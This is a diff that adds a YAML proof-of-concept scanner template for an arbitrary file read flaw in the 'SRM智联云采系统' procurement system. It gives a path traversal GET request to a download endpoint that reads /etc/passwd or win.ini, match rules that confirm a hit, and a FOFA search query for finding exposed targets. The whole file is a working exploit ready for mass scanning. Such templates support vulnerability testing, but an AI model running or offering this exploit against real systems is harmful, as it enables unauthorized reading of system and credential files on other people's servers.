@@ -1,0 +1,31 @@
+id: poc-yaml-srm-download-anyfile-read
+info:
+  name: SRM智联云采系统 download 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: srm
+  fofa: title=="SRM 2.0"
+variables:
+  files: 'c:\\windows\win.ini
+
+    /etc/passwd
+
+    '
+requests:
+- method: GET
+  path: /adpweb/static/..;/a/sys/runtimeLog/download?path={{.files}}
+  expression: '(status_code == 200 && !contains(body,"<")) &&
+
+    (
+
+    (contains(body,"bit app support") && contains(headers,"filename=win.ini"))
+
+    ||
+
+    (contains(body,"root:") && contains(body,"/bin"))
+
+    )
+
+    '
+transport: http
